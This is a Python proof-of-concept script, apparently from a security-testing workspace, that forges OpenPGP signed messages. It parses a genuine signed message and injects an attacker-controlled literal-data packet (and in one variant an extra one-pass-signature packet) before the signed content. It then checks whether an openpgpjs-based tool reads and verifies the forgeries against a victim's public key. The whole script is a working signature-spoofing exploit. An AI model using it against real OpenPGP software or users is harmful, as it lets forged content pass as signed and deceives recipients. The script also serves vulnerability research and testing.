import base64, re, struct, zlib, subprocess

B='/workspace/artifacts/target/openpgpjs'

def unarmor(txt):
    m = re.search(r'-----BEGIN PGP ([A-Z ]+)-----\r?\n(.*?)-----END PGP \1-----', txt, re.S)
    lines = []
    for l in m.group(2).splitlines():
        l = l.strip()
        if not l or l.startswith('=') or ':' in l: continue
        lines.append(l)
    return base64.b64decode(''.join(lines))

def parse(raw):
    i=0; out=[]
    while i < len(raw):
        b0=raw[i]; assert b0&0x80 and b0&0x40
        tag=b0&0x3f; i+=1; lb=raw[i]; i+=1
        if lb<192: ln=lb
        elif lb<224: ln=((lb-192)<<8)+raw[i]+192; i+=1
        elif lb==255: ln=struct.unpack('>I',raw[i:i+4])[0]; i+=4
        else: raise ValueError('partial')
        out.append((tag, raw[i:i+ln])); i+=ln
    return out

def pkt(tag, body):
    n=len(body)
    if n<192: l=bytes([n])
    elif n<8384: l=bytes([(n-192)//256+192,(n-192)%256])
    else: l=b'\xff'+struct.pack('>I',n)
    return bytes([0xC0|tag])+l+body

def armor(raw, kind='PGP MESSAGE'):
    b=base64.b64encode(raw).decode()
    lines=[b[i:i+64] for i in range(0,len(b),64)]
    return f"-----BEGIN {kind}-----\n\n"+'\n'.join(lines)+f"\n-----END {kind}-----\n"

def lit(data):
    return pkt(11, b'b'+bytes([0])+struct.pack('>I',0)+data)

raw = unarmor(open('signed.asc').read())
pkts = parse(raw)
ops_b, lit_b, sig_b = pkts[0][1], pkts[1][1], pkts[2][1]

PAYLOAD = b'PWNED: attacker-controlled payload content!'
c1 = pkt(4, ops_b) + lit(PAYLOAD) + pkt(11, lit_b) + pkt(2, sig_b)   # OPS LIT(P) LIT(B) SIG
open('c1.asc','w').write(armor(c1))
c2 = pkt(4, ops_b) + lit(PAYLOAD) + pkt(4, bytes([3,0,10,22])+b'\x00'*8+b'\x01') + pkt(11,lit_b) + pkt(2, sig_b)
open('c2.asc','w').write(armor(c2))

def run(*args):
    p = subprocess.run([B]+list(args), capture_output=True, text=True)
    return p.returncode, p.stdout.strip(), p.stderr.strip()

for f in ['c1.asc','c2.asc']:
    print(f, "read:", run('read-message','--message',f))
    print(f, "verify:", run('verify','--message',f,'--key','keys/victim-public.asc'))
    print()
